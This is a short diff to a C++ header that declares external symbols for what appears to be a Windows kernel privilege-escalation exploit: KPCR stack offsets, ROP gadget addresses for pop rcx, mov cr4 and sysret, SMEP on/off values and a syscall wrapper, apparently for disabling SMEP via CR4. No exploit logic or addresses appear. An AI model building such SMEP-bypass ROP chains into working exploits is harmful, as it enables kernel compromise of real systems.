@@ -1,6 +1,13 @@
 #pragma once
+#include <cstdint>
+extern "C" std::uint32_t m_kpcr_rsp_offset;
+extern "C" std::uint32_t m_kpcr_krsp_offset;
 
-extern "C" unsigned long long cr4_value;
-extern "C" unsigned long kpcr_rsp_offset;
-extern "C" unsigned long kpcr_krsp_offset;
-extern "C" void syscall_handler(unsigned long long rip);
+extern "C" std::uintptr_t m_pop_rcx_gadget;
+extern "C" std::uintptr_t m_mov_cr4_gadget;
+extern "C" std::uintptr_t m_sysret_gadget;
+
+extern "C" std::uintptr_t m_smep_on;
+extern "C" std::uintptr_t m_smep_off;
+extern "C" std::uintptr_t m_system_call;
+extern "C" void syscall_wrapper(...);
